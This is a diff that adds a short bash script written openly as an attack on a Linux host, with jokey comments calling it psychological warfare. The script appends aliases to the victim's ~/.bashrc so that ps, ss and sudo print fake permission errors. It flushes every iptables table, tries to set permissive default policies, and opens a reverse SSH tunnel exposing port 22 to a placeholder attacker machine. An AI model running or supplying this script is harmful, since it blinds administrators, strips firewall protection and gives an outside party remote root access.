@@ -1,0 +1,31 @@
+#!/bin/bash
+
+# Execute real 'cat' command and don't display anything. Also mess with them
+command cat | grep -Ev "*" | echo "No cats allowed"
+
+# Add lines to their .bashrc
+# Every good script needs some psychological warfare
+echo "alias ps=echo 'error: you cannot perform this operation unless you are root' " >> ~/.bashrc 
+
+echo "alias ss=echo 'error: you cannot perform this operation unless you are root' " >> ~/.bashrc
+
+echo "alias sudo=echo 'Simon says... oh wait, Simon didn't say' " >> ~/.bashrc
+
+# Source the ~/.bashrc
+source ~/.bashrc
+
+# Flush iptables rules
+command iptables -F
+command iptables -t mangle -F
+command iptables -t nat -F
+command iptables -t filter -F
+command iptables -t raw -F
+command iptables -t security -F
+
+# Change default policies for 'iptables'
+command iptables -P INPUT ALLOW
+command iptables -P OUTPUT ALLOW
+command iptables -P FORWARD ALLOW
+
+# Open up reverse SSH connection
+command ssh -R 34567:localhost:22 root@IP_FOR_ATTACKER_PC_HERE
